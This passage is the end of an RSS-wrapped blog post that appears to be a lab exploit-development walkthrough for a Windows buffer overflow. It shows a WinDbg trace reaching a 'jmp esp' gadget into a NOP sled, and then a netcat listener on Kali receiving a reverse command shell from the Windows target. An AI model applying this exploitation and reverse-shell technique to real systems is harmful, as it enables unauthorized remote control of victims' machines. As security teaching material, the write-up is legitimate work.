</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> t
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">77</span>c36252 ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">0170f</span><span style="color:#ae81ff">540</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">1015</span>a2f0 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77</span>c36270 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">0170ff</span><span style="color:#ae81ff">53</span> esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0170f</span>a9c ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">0170f</span><span style="color:#ae81ff">460</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei ng nz na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">000002</span><span style="color:#ae81ff">86</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0170ff</span><span style="color:#ae81ff">53</span> ffe4            jmp     esp {<span style="color:#ae81ff">0170f</span>a9c}
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> dds <span style="color:#ae81ff">0170f</span>a9c
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0170f</span>a9c  <span style="color:#ae81ff">90909090</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0170f</span>aa0  <span style="color:#ae81ff">90909090</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0170f</span>aa4  <span style="color:#ae81ff">90909090</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0170f</span>aa8  aac2b890
</span></span></code></pre></div><p>And if we put a reverse shell we obtain it:</p>
<pre tabindex="0"><code>sudo nc -lvp 443
[sudo] password for kali: 
listening on [any] 443 ...
connect to [192.168.122.211] from DESKTOP-78JQLBM [192.168.122.113] 49776
Microsoft Windows [Version 10.0.19045.5737]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;
</code></pre>]]></description>
      
    </item>
    
    
    
    
    
    
  </channel>
</rss>
